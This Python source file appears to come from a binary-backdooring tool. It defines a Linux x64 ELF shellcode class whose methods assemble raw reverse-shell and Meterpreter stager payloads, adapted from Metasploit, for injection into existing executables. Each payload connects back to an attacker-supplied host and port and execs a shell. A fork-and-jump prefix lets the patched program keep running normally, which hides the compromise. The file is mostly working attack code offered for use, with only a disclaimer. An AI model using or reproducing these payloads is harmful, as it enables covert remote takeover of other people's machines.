'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI64_shellcode():
    """
    ELF Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""

        

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
                        "\x48\x97\x48\xb9\x02\x00")
                        #\x22\xb8"
                        #"\x7f\x00\x00\x01
        self.shellcode1 += struct.pack("!H", self.PORT)
                        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89"
                        "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
                        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
                        "\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
                        "\x0f\x05")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
                            "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
                            "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00")
        self.shellcode1 += struct.pack("!H", self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
                            "\x05\x59\x5e\x5a\x0f\x05\xff\xe6")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)


